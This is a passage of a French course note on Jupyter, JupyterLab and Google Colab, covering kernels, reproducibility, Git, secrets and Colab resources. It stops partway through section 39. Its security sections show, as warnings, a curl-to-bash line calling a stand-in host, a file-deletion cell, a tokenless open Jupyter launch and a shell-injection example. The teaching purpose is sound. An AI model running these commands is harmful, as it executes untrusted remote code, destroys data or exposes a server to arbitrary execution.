---
schema_version: 1
uid: "01M02EX5B7CGA0SZHY0Y0XG7XB"
titre: "Jupyter Notebook et Google Colab"
type: cours
statut: actif
para: ressource
domaines:
  - enseignement
themes:
  - informatique
  - python
  - data-science
  - notebooks
  - jupyter
resume: "Cours complet sur Jupyter, JupyterLab et Google Colab : architecture des notebooks, kernels, environnements, reproductibilité, sécurité, collaboration, GPU/TPU, Git et bonnes pratiques."
niveau: debutant
auteurs:
  - "Michaël Launay"
langue: fr
date_creation: 2024-10-24
date_modification: 2026-08-29
confidentialite: publique
publication:
  - notes-publiques
rag: true
metadata_verifiees: true
---
# Jupyter Notebook et Google Colab

> [!abstract] Objectif
> Utiliser Jupyter, JupyterLab et Google Colab en comprenant ce qui se passe : architecture des notebooks et des kernels, environnements et reproductibilité, sécurité, collaboration, GPU et TPU, intégration avec Git, et bonnes pratiques pour passer du notebook exploratoire au code maintenable.

Voir aussi : [[Python]], [[Numpy]], [[Pandas]], [[Pytorch]], [[Machine Learning]], [[git]], [[Visual studio code]].

Jupyter et Google Colab appartiennent à la même famille d'outils : les **notebooks computationnels**. Un notebook combine dans un même document :

- du code exécutable ;
- du texte explicatif ;
- des équations ;
- des tableaux ;
- des graphiques ;
- des résultats d'exécution ;
- éventuellement des contrôles interactifs.

Leur intérêt principal est l'**exploration interactive**. Leur principale faiblesse est la facilité avec laquelle l'état d'exécution peut devenir implicite et donc difficile à reproduire.

> Un notebook n'est pas seulement un fichier de code : c'est un document associé à un **état d'exécution**.

Ce cours distingue trois éléments souvent confondus :

| Élément | Rôle |
| --- | --- |
| **Jupyter** | Projet, protocoles et formats ouverts pour le calcul interactif |
| **Jupyter Notebook / JupyterLab** | Interfaces locales ou hébergées utilisant ces protocoles |
| **Google Colab** | Service Google hébergé compatible avec les notebooks Jupyter |

Au 29 août 2026, **Jupyter Notebook 7** repose sur Jupyter Server et des composants de JupyterLab. JupyterLab 4.x constitue l'environnement riche de référence, tandis que Notebook 7 propose une interface plus légère.

---

# Sommaire

1. Histoire : d'IPython à Jupyter
2. Architecture générale de Jupyter
3. Le format `.ipynb`
4. Installer Jupyter proprement
5. Kernels et environnements Python
6. Les types de cellules
7. Exécution : le piège de l'état caché
8. IPython : commandes magiques
9. Commandes shell depuis un notebook
10. Affichages riches
11. Visualisation
12. Widgets interactifs
13. Débogage dans Jupyter
14. Reproductibilité des environnements
15. Reproductibilité des calculs aléatoires
16. Structurer un notebook propre
17. Notebook exploratoire vs code de production
18. Tester du code issu d'un notebook
19. Exécuter automatiquement un notebook
20. Jupyter et Git
21. Sécurité : un notebook est du code exécutable
22. Secrets et identifiants
23. Extensions JupyterLab
24. Collaboration
25. Introduction à Google Colab
26. Colab : VM et stockage éphémère
27. Vérifier l'environnement Colab
28. Installer des dépendances dans Colab
29. GPU dans Colab
30. TPU dans Colab
31. Google Drive dans Colab
32. Télécharger et envoyer des fichiers dans Colab
33. Git dans Colab
34. Colab et Hugging Face
35. Runtime local avec Colab
36. Limites et quotas de Colab
37. Activités interdites ou limitées dans Colab
38. Sauvegarder un entraînement long
39. Datasets volumineux
40. Notebooks et données sensibles
41. Nettoyer les sorties sensibles
42. Notebook « Restart and Run All » comme test minimal
43. Papermill et notebooks paramétrés
44. Notebooks dans une CI
45. Jupyter Book, Quarto et publication
46. Notebook vs script Python
47. Notebook vs IDE
48. Anti-patterns fréquents
49. Modèle de notebook reproductible
50. TP 1 — Premier notebook local
51. TP 2 — Créer un kernel dédié
52. TP 3 — État caché
53. TP 4 — Analyse de données
54. TP 5 — Git et notebook
55. TP 6 — Notebook automatisé
56. TP 7 — Colab et stockage éphémère
57. TP 8 — GPU Colab
58. TP 9 — Reprise après interruption
59. TP 10 — Audit de sécurité d'un notebook
60. TP 11 — Jupytext
61. TP 12 — Projet final
62. Checklist Jupyter
63. Checklist Colab
64. Glossaire
65. Points essentiels à retenir
66. Références officielles

# 1. Histoire : d'IPython à Jupyter

## 1.1 IPython

IPython est créé en 2001 par Fernando Pérez pour fournir une expérience Python interactive beaucoup plus riche que l'interpréteur standard.

IPython introduit notamment :

- historique amélioré ;
- complétion ;
- affichage enrichi ;
- commandes magiques ;
- introspection ;
- intégration avec les bibliothèques scientifiques.

Exemple d'introspection IPython :

```python
len?
```

ou :

```python
import numpy as np
np.ndarray??
```

Un `?` affiche l'aide ; `??` peut également afficher le code source lorsqu'il est accessible.

## 1.2 Le notebook IPython

Le notebook web IPython apparaît au début des années 2010. L'idée est de déplacer l'expérience interactive vers un navigateur et d'enregistrer à la fois :

- les cellules de code ;
- les cellules Markdown ;
- leurs métadonnées ;
- les résultats produits.

Cette combinaison rend le notebook particulièrement adapté à la science des données et à l'enseignement.

## 1.3 Project Jupyter

En 2014, les composants indépendants du langage Python sont séparés d'IPython et deviennent **Project Jupyter**.

Le nom évoque historiquement trois langages importants dans le calcul scientifique :

- **Ju**lia ;
- **Py**thon ;
- **R**.

Mais Jupyter n'est pas limité à ces trois langages. Il peut utiliser de nombreux kernels : Python, R, Julia, Java, C++, Rust, .NET, etc.

## 1.4 JupyterLab et Notebook 7

JupyterLab devient progressivement l'environnement complet :

- notebooks ;
- éditeur texte ;
- terminal ;
- explorateur de fichiers ;
- consoles ;
- extensions ;
- visualisations ;
- dispositions multi-panneaux.

**Notebook 7** est une modernisation majeure du Notebook historique. Il repose :

- côté serveur sur **Jupyter Server** ;
- côté interface sur des composants issus de JupyterLab.

Cette architecture explique pourquoi certaines anciennes extensions conçues pour Notebook 6 ne fonctionnent pas directement avec Notebook 7.

---

# 2. Architecture générale de Jupyter

Un système Jupyter est composé de plusieurs processus distincts.

```text
Navigateur
   |
   | HTTP / WebSocket
   v
Jupyter Server
   |
   | protocole de messages Jupyter
   v
Kernel
   |
   v
Interpréteur / runtime
```

## 2.1 Le frontend

Le frontend est l'interface utilisateur :

- Jupyter Notebook ;
- JupyterLab ;
- VS Code ;
- Google Colab ;
- d'autres clients compatibles.

Le frontend ne constitue pas le moteur d'exécution Python.

## 2.2 Jupyter Server

Jupyter Server gère notamment :

- les fichiers ;
- les sessions ;
- les kernels ;
- les communications WebSocket ;
- l'authentification lorsqu'elle est configurée ;
- certaines extensions serveur.

## 2.3 Le kernel

Le **kernel** est le processus qui exécute le code.

Pour Python, il s'agit généralement d'**IPykernel**.

Le kernel conserve son état en mémoire :

```python
x = 42
```

Une cellule exécutée plus tard peut utiliser `x` tant que le kernel n'a pas été redémarré.

## 2.4 Le protocole Jupyter

Les frontends et kernels échangent des messages structurés. Cela permet de découpler l'interface du langage.

Quelques catégories de messages :

- exécution ;
- complétion ;
- inspection ;
- affichage ;
- erreurs ;
- entrées utilisateur.

Cette séparation rend possible l'utilisation du même notebook avec des kernels très différents.

---

# 3. Le format `.ipynb`

Un notebook Jupyter est un document JSON.

Structure simplifiée :

```json
{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {},
      "outputs": [],
      "source": ["print('Bonjour')"]
    }
  ],
  "metadata": {},
  "nbformat": 4,
  "nbformat_minor": 5
}
```

Le notebook contient donc à la fois :

- le **source** ;
- les résultats ;
- les compteurs d'exécution ;
- les métadonnées ;
- des informations sur le kernel.

## 3.1 Conséquence pour Git

Un `.ipynb` peut contenir beaucoup de bruit :

- images encodées ;
- sorties volumineuses ;
- changements de compteurs d'exécution ;
- métadonnées modifiées automatiquement.

Deux lignes de Python modifiées peuvent donc produire un diff JSON difficile à relire.

Des outils comme **nbdime** améliorent les diffs et merges de notebooks.

```bash
python -m pip install nbdime
nbdime config-git --enable --global
```

## 3.2 Nettoyer les sorties avant commit

On peut retirer les sorties :

```bash
jupyter nbconvert \
  --ClearOutputPreprocessor.enabled=True \
  --inplace notebook.ipynb
```

Une autre approche consiste à utiliser `nbstripout` via Git.

---

# 4. Installer Jupyter proprement

Il est recommandé de ne pas installer tout l'écosystème scientifique dans l'environnement Python système.

## 4.1 Avec `venv`

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install jupyterlab notebook ipykernel
```

Puis :

```bash
jupyter lab
```

ou :

```bash
jupyter notebook
```

## 4.2 Avec `uv`

Un projet moderne peut également utiliser `uv` :

```bash
uv venv
source .venv/bin/activate
uv pip install jupyterlab ipykernel numpy pandas matplotlib
```

## 4.3 Vérifier les versions

```bash
jupyter --version
python --version
```

## 4.4 Notebook ou JupyterLab ?

Choisir **Notebook** lorsque l'on souhaite une interface simple centrée sur un notebook.

Choisir **JupyterLab** lorsque l'on souhaite :

- plusieurs fichiers côte à côte ;
- un terminal ;
- des consoles ;
- un débogueur ;
- un explorateur de fichiers ;
- des extensions ;
- un environnement de travail complet.

---

# 5. Kernels et environnements Python

L'une des sources d'erreur les plus fréquentes est la confusion entre :

- l'environnement Python ayant lancé Jupyter ;
- l'environnement Python utilisé par le kernel.

## 5.1 Vérifier le Python du kernel

Dans une cellule :

```python
import sys
print(sys.executable)
print(sys.version)
```

Cela indique le Python réellement utilisé pour exécuter le notebook.

## 5.2 Installer un kernel pour un environnement

Dans l'environnement concerné :

```bash
python -m pip install ipykernel
python -m ipykernel install \
  --user \
  --name mon-projet \
  --display-name "Python (mon-projet)"
```

Lister les kernels :

```bash
jupyter kernelspec list
```

Supprimer un kernel :

```bash
jupyter kernelspec uninstall mon-projet
```

## 5.3 Pourquoi `pip install` peut sembler ne pas fonctionner

Cette commande shell :

```python
!pip install pandas
```

peut utiliser un autre `pip` que celui du kernel.

Dans IPython/Jupyter, préférer :

```python
%pip install pandas
```

La magie `%pip` est conçue pour installer dans l'environnement du kernel actif.

On peut également être explicite :

```python
import sys
!{sys.executable} -m pip install pandas
```

---

# 6. Les types de cellules

## 6.1 Code

Une cellule code est exécutée par le kernel.

```python
x = 2
x ** 10
```

La dernière expression est automatiquement affichée par IPython.

## 6.2 Markdown

Une cellule Markdown peut contenir :

```markdown
# Titre

**Important** : résultat de l'expérience.

- hypothèse ;
- méthode ;
- conclusion.
```

Les notebooks prennent également en charge les mathématiques LaTeX/MathJax :

```text
$$
E = mc^2
$$
```

## 6.3 Raw

Une cellule `raw` n'est généralement pas interprétée comme Markdown ou code. Elle peut être utile lors de certaines conversions avec nbconvert.

---

# 7. Exécution : le piège de l'état caché

Un notebook peut être visuellement ordonné mais avoir été exécuté dans un autre ordre.

Exemple :

Cellule A :

```python
x = 10
```

Cellule B :

```python
x += 5
```

Cellule C :

```python
print(x)
```

Si B a été exécutée plusieurs fois, le résultat de C dépend de l'historique du kernel.

## 7.1 Le test fondamental

Avant de considérer un notebook reproductible :

1. sauvegarder ;
2. redémarrer le kernel ;
3. exécuter toutes les cellules depuis le début ;
4. vérifier que tout fonctionne sans intervention cachée.

Selon l'interface, utiliser une commande du type :

> Restart Kernel and Run All Cells

## 7.2 Éviter l'état implicite

Préférer :

```python
def load_data(path):
    ...
```

à une suite de cellules modifiant progressivement des variables globales difficiles à suivre.

Un bon notebook possède un flux logique **haut → bas**.

---

# 8. IPython : commandes magiques

Les commandes magiques sont spécifiques à IPython.

## 8.1 Magies de ligne

```python
%pwd
%who
%time sum(range(1_000_000))
%history -n 1-10
```

## 8.2 Magies de cellule

```python
%%time
values = [x * x for x in range(1_000_000)]
```

Autres exemples :

```python
%%bash
echo "Bonjour depuis Bash"
uname -a
```

```python
%%writefile example.py
print("Hello")
```

## 8.3 Changer de répertoire

Une erreur classique :

```python
!cd /tmp
```

Cette commande s'exécute dans un sous-shell ; le répertoire du kernel ne change pas durablement.

Utiliser plutôt :

```python
%cd /tmp
```

ou en Python :

```python
from pathlib import Path
import os

os.chdir(Path("/tmp"))
```

---

# 9. Commandes shell depuis un notebook

Le préfixe `!` demande à IPython d'exécuter une commande shell.

```python
!pwd
!ls -lah
```

## 9.1 Variables Python vers le shell

```python
filename = "data.csv"
!ls -lh {filename}
```

## 9.2 Capturer la sortie

```python
files = !ls
print(files)
```

IPython renvoie une liste enrichie plutôt qu'une simple chaîne brute.

## 9.3 Attention à l'injection de commandes

Ne jamais construire une commande shell avec une entrée non fiable :

```python
# À éviter avec une valeur utilisateur non contrôlée.
name = input("Fichier : ")
!cat {name}
```

Pour une application réelle, utiliser les API Python ou `subprocess` avec une liste d'arguments.

---

# 10. Affichages riches

Jupyter sait afficher plusieurs représentations d'un même objet.

## 10.1 HTML

```python
from IPython.display import HTML

HTML("<strong>Résultat</strong>")
```

## 10.2 Markdown

```python
from IPython.display import Markdown, display

display(Markdown("## Résultat dynamique"))
```

## 10.3 Image

```python
from IPython.display import Image

Image(filename="figure.png")
```

## 10.4 DataFrames

```python
import pandas as pd

frame = pd.DataFrame({
    "langage": ["Python", "Julia", "R"],
    "usage": ["généraliste/data", "calcul scientifique", "statistiques"],
})
frame
```

Les bibliothèques peuvent fournir des représentations HTML spécialisées via les protocoles d'affichage IPython.

---

# 11. Visualisation

## 11.1 Matplotlib

```python
import matplotlib.pyplot as plt

x = [1, 2, 3, 4]
y = [1, 4, 9, 16]

fig, ax = plt.subplots()
ax.plot(x, y)
ax.set_xlabel("x")
ax.set_ylabel("x²")
ax.set_title("Carrés")
plt.show()
```

## 11.2 Figure reproductible

Pour une figure destinée à un rapport :

```python
fig.savefig("carres.svg", bbox_inches="tight")
```

Ne pas considérer l'affichage intégré au notebook comme la seule copie du résultat scientifique important.

---

# 12. Widgets interactifs

`ipywidgets` permet de créer des contrôles interactifs.

Installation :

```python
%pip install ipywidgets
```

Exemple :

```python
import ipywidgets as widgets
from IPython.display import display

slider = widgets.IntSlider(
    value=5,
    min=0,
    max=20,
    description="n",
)

display(slider)
```

Avec `interact` :

```python
from ipywidgets import interact

@interact(n=(1, 20))
def square(n=5):
    return n * n
```

Les widgets reposent sur une communication entre frontend et kernel. Leur comportement dépend donc de la compatibilité de l'environnement utilisé pour afficher le notebook.

---

# 13. Débogage dans Jupyter

## 13.1 Traceback

Lorsqu'une exception survient, IPython affiche un traceback enrichi.

```python
def divide(a, b):
    return a / b

divide(1, 0)
```

## 13.2 Post-mortem

Après une exception :

```python
%debug
```

## 13.3 `breakpoint()`

```python
def compute(values):
    total = 0
    for value in values:
        breakpoint()
        total += value
    return total
```

## 13.4 Débogueur de JupyterLab

JupyterLab peut fournir une interface graphique de débogage lorsqu'un kernel compatible avec le protocole de débogage est utilisé.

---

# 14. Reproductibilité des environnements

Un notebook n'est reproductible que si l'environnement peut lui aussi être reconstruit.

## 14.1 Mauvaise pratique

Écrire uniquement :

```python
%pip install pandas
```

sans noter la version rend le résultat dépendant du jour de l'exécution.

## 14.2 Versionner les dépendances

Par exemple :

```text
requirements.txt
```

```text
numpy==2.3.2
pandas==2.3.2
matplotlib==3.10.5
```

Les versions exactes ne doivent être figées que lorsqu'elles correspondent à la politique du projet.

Pour des projets plus structurés, utiliser :

- `pyproject.toml` ;
- `uv.lock` ;
- Poetry ;
- Conda/Mamba selon les besoins scientifiques.

## 14.3 Documenter l'environnement

Dans un notebook de recherche :

```python
import platform
import sys

print("Python:", sys.version)
print("Executable:", sys.executable)
print("OS:", platform.platform())
```

Pour un diagnostic ponctuel :

```python
%pip list
```

Éviter toutefois de remplir le notebook avec des centaines de lignes de versions si un lockfile est déjà versionné.

---

# 15. Reproductibilité des calculs aléatoires

Fixer une graine améliore la reproductibilité mais ne garantit pas toujours un résultat bit-à-bit sur tous les matériels.

```python
import random
import numpy as np

SEED = 42
random.seed(SEED)
np.random.seed(SEED)
```

Avec PyTorch :

```python
import torch

torch.manual_seed(SEED)
```

Des différences peuvent subsister selon :

- CPU/GPU ;
- versions des bibliothèques ;
- kernels CUDA ;
- parallélisme ;
- algorithmes non déterministes.

Voir aussi le cours [[Pytorch]].

---

# 16. Structurer un notebook propre

Un notebook pédagogique ou analytique devrait être organisé comme un document.

Structure possible :

```text
1. Objectif
2. Hypothèses
3. Imports et configuration
4. Chargement des données
5. Contrôles qualité
6. Analyse
7. Visualisation
8. Résultats
9. Limites
10. Conclusion
```

## 16.1 Centraliser les imports

```python
from pathlib import Path

import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
```

## 16.2 Centraliser la configuration

```python
DATA_DIR = Path("data")
RESULTS_DIR = Path("results")
RESULTS_DIR.mkdir(exist_ok=True)
```

## 16.3 Transformer le code stable en module

Lorsque plusieurs cellules contiennent des fonctions réutilisables, déplacer progressivement ce code vers :

```text
src/
  project/
    __init__.py
    preprocessing.py
    model.py
notebooks/
  exploration.ipynb
```

Le notebook doit idéalement orchestrer et expliquer, pas devenir l'unique emplacement du code métier.

---

# 17. Notebook exploratoire vs code de production

Un notebook est excellent pour :

- exploration ;
- expérimentation ;
- démonstration ;
- visualisation ;
- enseignement ;
- analyse ponctuelle.

Il est généralement moins adapté comme unité principale pour :

- API de production ;
- daemon ;
- job critique récurrent ;
- bibliothèque réutilisable ;
- service supervisé ;
- pipeline complexe avec tests et reprise après erreur.

Une progression saine :

```text
exploration notebook
        |
        v
fonctions stabilisées
        |
        v
module Python testé
        |
        v
pipeline / application
```

Le notebook peut rester comme couche d'analyse ou de reporting.

---

# 18. Tester du code issu d'un notebook

Les fonctions importantes doivent pouvoir être testées en dehors du notebook.

Exemple :

```python
def normalize(values):
    minimum = min(values)
    maximum = max(values)
    if maximum == minimum:
        return [0.0 for _ in values]
    return [
        (value - minimum) / (maximum - minimum)
        for value in values
    ]
```

Puis dans `tests/test_preprocessing.py` :

```python
from project.preprocessing import normalize


def test_normalize():
    assert normalize([0, 5, 10]) == [0.0, 0.5, 1.0]
```

Lancer :

```bash
pytest
```

---

# 19. Exécuter automatiquement un notebook

## 19.1 nbconvert

```bash
jupyter nbconvert \
  --to notebook \
  --execute analyse.ipynb \
  --output analyse-executed.ipynb
```

Avec timeout :

```bash
jupyter nbconvert \
  --to notebook \
  --execute analyse.ipynb \
  --ExecutePreprocessor.timeout=600
```

## 19.2 Export HTML

```bash
jupyter nbconvert --to html analyse.ipynb
```

## 19.3 Export script

```bash
jupyter nbconvert --to script analyse.ipynb
```

L'export en script ne transforme pas automatiquement un notebook mal structuré en programme de production. Il faut souvent refactoriser le code.

---

# 20. Jupyter et Git

## 20.1 Pourquoi les conflits sont difficiles

Le JSON du notebook mélange source et sorties. Deux utilisateurs peuvent modifier des cellules distinctes mais créer un conflit dans les métadonnées.

## 20.2 Conseils

- éviter de commit des sorties énormes ;
- réexécuter le notebook proprement avant une version importante ;
- utiliser nbdime ;
- extraire le code réutilisable dans des modules ;
- éviter plusieurs personnes modifiant simultanément le même gros notebook ;
- ne jamais placer de secret dans une cellule versionnée.

## 20.3 Pairing notebook / fichier texte

Des outils comme **Jupytext** peuvent synchroniser un notebook avec un format texte, par exemple Markdown ou Python.

Cela rend les diffs Git beaucoup plus lisibles.

Exemple d'installation :

```bash
python -m pip install jupytext
```

---

# 21. Sécurité : un notebook est du code exécutable

Un notebook reçu d'une autre personne doit être traité comme un programme reçu d'une autre personne.

> Lire le notebook n'est pas la même chose que l'exécuter.

Une cellule peut contenir :

```python
import os
os.remove("fichier-important")
```

ou :

```python
!curl https://example.invalid/script.sh | bash
```

Le fait qu'un code soit affiché dans une jolie interface ne le rend pas sûr.

## 21.1 Modèle de confiance Jupyter

Jupyter signe les notebooks considérés comme fiables. Les sorties HTML/JavaScript d'un notebook non fiable ne doivent pas être automatiquement traitées comme si elles avaient été produites localement.

On peut explicitement marquer un notebook comme fiable :

```bash
jupyter trust notebook.ipynb
```

Ne faire cela qu'après examen du notebook.

## 21.2 Ne pas exposer Jupyter sans protection

Éviter :

```bash
jupyter lab --ip=0.0.0.0 --ServerApp.token=''
```

sur une machine accessible par un réseau non fiable.

Un serveur Jupyter donne potentiellement accès à l'exécution arbitraire de code avec les droits du compte qui l'exécute.

Pour un accès distant :

- authentification ;
- HTTPS/reverse proxy correctement configuré ;
- firewall ;
- VPN ou tunnel SSH lorsque pertinent ;
- moindre privilège ;
- mises à jour de sécurité.

## 21.3 Répertoire servi

Ne pas démarrer inutilement Jupyter à la racine du dossier personnel si les notebooks n'ont besoin que d'un projet restreint.

```bash
cd ~/projects/analyse
jupyter lab
```

---

# 22. Secrets et identifiants

## 22.1 À ne jamais faire

```python
API_KEY = "sk-secret-reel"
```

si le notebook peut être partagé ou versionné.

## 22.2 Variables d'environnement

```python
import os

api_key = os.environ["API_KEY"]
```

## 22.3 Saisie interactive

```python
from getpass import getpass

api_key = getpass("API key : ")
```

## 22.4 Colab Secrets

Google Colab dispose également d'un mécanisme de secrets dans son interface. Le principe reste le même : **séparer les secrets du contenu du notebook**.

---

# 23. Extensions JupyterLab

JupyterLab utilise un système d'extensions riche.

Lister l'état :

```bash
jupyter labextension list
```

Les extensions peuvent apporter :

- formatage ;
- intégration Git ;
- LSP ;
- visualisations ;
- collaboration ;
- thèmes ;
- outils IA.

## 23.1 Sécurité des extensions

Une extension dispose potentiellement d'un accès important à l'environnement Jupyter. Il faut donc :

- vérifier sa provenance ;
- regarder son activité de maintenance ;
- privilégier les dépôts officiels/reconnus ;
- maintenir JupyterLab à jour ;
- éviter d'installer sans revue une longue liste d'extensions inconnues.

Les versions récentes de JupyterLab ont reçu plusieurs correctifs de sécurité relatifs aux extensions et au frontend, ce qui renforce l'importance des mises à jour.

---

# 24. Collaboration

Plusieurs modèles existent.

## 24.1 Partage du fichier

Le mode le plus simple :

```text
.ipynb -> Git / Drive / plateforme de fichiers
```

Il ne s'agit pas d'une édition simultanée.

## 24.2 JupyterHub

JupyterHub permet de fournir des environnements Jupyter à plusieurs utilisateurs avec authentification et isolation adaptées à une organisation.

Cas d'usage :

- université ;
- laboratoire ;
- entreprise ;
- plateforme de cours.

## 24.3 Collaboration temps réel

JupyterLab peut prendre en charge des mécanismes de collaboration temps réel selon la configuration et les extensions déployées.

Pour des usages institutionnels, il faut néanmoins réfléchir à :

- authentification ;
- droits d'accès ;
- stockage ;
- quotas ;
- sauvegardes ;
- traçabilité ;
- données personnelles.

---

# 25. Introduction à Google Colab

Google Colab est un service hébergé de notebooks compatible avec l'écosystème Jupyter.

Ses atouts principaux :

- aucune installation locale nécessaire ;
- partage proche de Google Docs ;
- accès à du calcul distant ;
- disponibilité possible de GPU et TPU ;
- intégration avec Google Drive ;
- environnement Python préinstallé.

Ses contraintes principales :

- VM éphémère ;
- ressources non garanties ;
- limitations dynamiques ;
- environnement préinstallé susceptible d'évoluer ;
- dépendance à un service tiers ;
- certaines activités interdites par les règles d'utilisation.

---

# 26. Colab : VM et stockage éphémère

Un notebook `.ipynb` enregistré sur Drive ou Git est distinct de la VM qui l'exécute.

```text
Notebook persistant
        |
        v
Runtime / VM Colab
        |
        +-- RAM éphémère
        +-- disque local éphémère
        +-- logiciels installés pour la session
```

Lorsque le runtime est supprimé ou remplacé :

- les variables Python disparaissent ;
- les paquets installés uniquement dans la VM disparaissent ;
- les fichiers présents uniquement sur le disque local disparaissent.

Il faut donc pouvoir reconstruire l'environnement.

## 26.1 Ne pas écrire « les fichiers sont conservés exactement 12 h »

Les limites Colab sont **dynamiques**. Google indique que les délais d'inactivité, durées de VM et ressources disponibles peuvent varier.

Pour l'offre gratuite, un notebook peut généralement fonctionner **au maximum 12 heures**, mais cela ne constitue pas une garantie de durée de conservation des fichiers locaux.

L'idée à retenir est :

> Le stockage local du runtime Colab est temporaire.

---

# 27. Vérifier l'environnement Colab

Dans Colab :

```python
import os
import platform
import sys

print(sys.version)
print(platform.platform())
print(os.getcwd())
```

Pour connaître les versions principales :

```python
import numpy as np
import torch

print("NumPy:", np.__version__)
print("PyTorch:", torch.__version__)
```

Les runtimes Colab évoluent régulièrement. Au lieu de supposer une version particulière, un notebook robuste vérifie les dépendances dont il a réellement besoin.

Google permet également, pendant une durée limitée, de choisir certaines **versions de runtime antérieures** afin de stabiliser un cours ou un atelier.

---

# 28. Installer des dépendances dans Colab

Utiliser :

```python
%pip install "pandas>=2.2,<3"
```

ou installer depuis un fichier de dépendances :

```python
%pip install -r requirements.txt
```

Pour un atelier stable, il peut être utile de figer les versions critiques :

```python
%pip install "transformers==4.56.0" "datasets==4.0.0"
```

Les versions ci-dessus sont seulement un exemple de stratégie de pinning : choisir celles validées par le projet.

## 28.1 Paquets système

Colab étant basé sur Linux, on peut parfois utiliser :

```python
!apt-get update -qq
!apt-get install -y graphviz
```

Mais une modification importante du système peut casser l'environnement préinstallé. Préférer les installations minimales et reproductibles.

---

# 29. GPU dans Colab

Un runtime GPU ne signifie pas automatiquement que le calcul utilise le GPU.

## 29.1 Vérifier le matériel

```python
!nvidia-smi
```

Avec PyTorch :

```python
import torch

print(torch.cuda.is_available())
if torch.cuda.is_available():
    print(torch.cuda.get_device_name(0))
```

## 29.2 Utiliser le GPU

```python
import torch

if torch.cuda.is_available():
    device = torch.device("cuda")
else:
    device = torch.device("cpu")

x = torch.randn(1024, 1024, device=device)
y = x @ x
print(y.device)
```

## 29.3 Le type de GPU n'est pas garanti

Ne pas écrire un notebook supposant :

> « Colab fournit toujours un T4 »

Le matériel disponible dépend :

- du plan ;
- de la disponibilité ;
- de l'usage récent ;
- des politiques de Colab.

Tester les capacités du runtime au démarrage.

---

# 30. TPU dans Colab

Colab peut proposer des runtimes TPU.

Un TPU n'est pas un GPU. Le code doit utiliser un framework et une stratégie compatibles.

Exemples d'écosystèmes courants :

- JAX ;
- TensorFlow ;
- PyTorch/XLA selon les workflows.

Un notebook destiné à plusieurs accélérateurs doit éviter de disperser les hypothèses matérielles dans toutes les cellules.

Centraliser la sélection :

```python
BACKEND = "cpu"
```

puis adapter l'initialisation selon le framework.

---

# 31. Google Drive dans Colab

Monter Drive :

```python
from google.colab import drive

drive.mount("/content/drive")
```

Un chemin courant est ensuite :

```python
from pathlib import Path

MY_DRIVE = Path("/content/drive/MyDrive")
```

## 31.1 Drive n'est pas un disque local rapide

Éviter d'entraîner un modèle en lisant des millions de petits fichiers directement depuis Drive.

Meilleure stratégie :

1. conserver une archive/dataset sur Drive ;
2. copier vers `/content` ;
3. décompresser localement ;
4. effectuer le calcul ;
5. sauvegarder les résultats importants vers Drive.

Exemple :

```python
!cp /content/drive/MyDrive/datasets/images.tar.gz /content/
!tar -xzf /content/images.tar.gz -C /content/
```

Google indique que de très grands nombres de fichiers dans un même dossier Drive peuvent provoquer des lenteurs ou des erreurs de montage.

---

# 32. Télécharger et envoyer des fichiers dans Colab

## 32.1 Upload interactif

```python
from google.colab import files

uploaded = files.upload()
```

## 32.2 Download interactif

```python
from google.colab import files

files.download("resultats.csv")
```

Pour de gros volumes, cette méthode est moins adaptée qu'un stockage dédié, Drive ou un stockage objet.

---

# 33. Git dans Colab

Cloner un dépôt :

```python
!git clone https://github.com/example/project.git
%cd project
```

Puis installer :

```python
%pip install -e .
```

## 33.1 Dépôts privés

Ne pas écrire un token directement dans l'URL du notebook.

À éviter :

```text
https://TOKEN_SECRET@github.com/organisation/private.git
```

Utiliser un secret ou un mécanisme d'authentification adapté.

## 33.2 Colab et Git ne remplacent pas l'un l'autre

- Git versionne le code et l'historique ;
- Colab fournit un environnement d'exécution ;
- Drive stocke des fichiers ;
- le notebook est l'interface/document.

---

# 34. Colab et Hugging Face

Pour accéder à Hugging Face sans exposer un token :

```python
import os

hf_token = os.environ.get("HF_TOKEN")
```

ou utiliser les secrets Colab.

Un workflow typique :

```text
Git/Hugging Face Hub
       |
       v
notebook Colab
       |
       v
runtime GPU/TPU
       |
       v
checkpoint / dataset / résultats
       |
       v
Hub ou stockage persistant
```

Ne pas conserver l'unique copie d'un checkpoint important sur `/content`.

---

# 35. Runtime local avec Colab

Colab peut être utilisé avec certaines ressources de calcul que l'utilisateur contrôle, selon les modes disponibles et la configuration du service.

L'intérêt est de conserver :

- l'interface Colab ;
- mais un runtime dont on contrôle mieux le matériel ou l'environnement.

Il faut alors traiter le runtime comme un serveur donnant à Colab la capacité d'exécuter du code : ne pas exposer sans précaution un runtime local à des notebooks non fiables.

---

# 36. Limites et quotas de Colab

Google ne publie pas un tableau fixe garantissant :

- X heures par jour ;
- tel modèle de GPU ;
- telle quantité exacte de RAM ;
- tel délai d'inactivité.

Ces paramètres peuvent varier.

La bonne stratégie est donc :

- checkpoint régulier ;
- code reprenable ;
- données persistantes séparées ;
- ne pas supposer une session infinie ;
- ne pas contourner les limitations par plusieurs comptes ou automatisations interdites.

## 36.1 Durée des runtimes

D'après la FAQ Colab actuelle :

- le niveau gratuit peut exécuter un notebook jusqu'à environ 12 h au maximum, selon disponibilité et usage ;
- Pro+ peut permettre jusqu'à 24 h d'exécution continue lorsque les unités de calcul disponibles le permettent ;
- les délais d'inactivité et limites peuvent changer.

Ces chiffres sont des limites de service, pas un contrat de disponibilité.

---

# 37. Activités interdites ou limitées dans Colab

Colab est conçu pour le calcul interactif, pas comme hébergeur généraliste.

Parmi les usages interdits ou limités dans les runtimes gérés figurent notamment :

- minage de cryptomonnaie ;
- attaques DoS ;
- cassage de mots de passe ;
- torrents/P2P ;
- utilisation de plusieurs comptes pour contourner les quotas ;
- certains usages de proxy ou d'hébergement de services non liés au notebook interactif.

Il faut consulter les conditions et FAQ actuelles avant de construire un workflow dépendant d'un usage atypique.

---

# 38. Sauvegarder un entraînement long

Un entraînement doit pouvoir reprendre après interruption.

Exemple simplifié PyTorch :

```python
from pathlib import Path
import torch

checkpoint_path = Path("checkpoint.pt")

checkpoint = {
    "epoch": epoch,
    "model": model.state_dict(),
    "optimizer": optimizer.state_dict(),
}

torch.save(checkpoint, checkpoint_path)
```

Puis copier le checkpoint vers un stockage persistant.

Pour le chargement de poids non fiables, appliquer les recommandations de sécurité du framework et éviter les formats permettant l'exécution arbitraire lorsque cela n'est pas nécessaire.

Voir [[Pytorch]].

---

# 39. Datasets volumineux

Un mauvais workflow :

```text
Drive -> lire 500 000 petits fichiers à chaque batch
```

Un meilleur workflow :

```text
stockage persistant
       |
       v
archive / shards
       |
       v
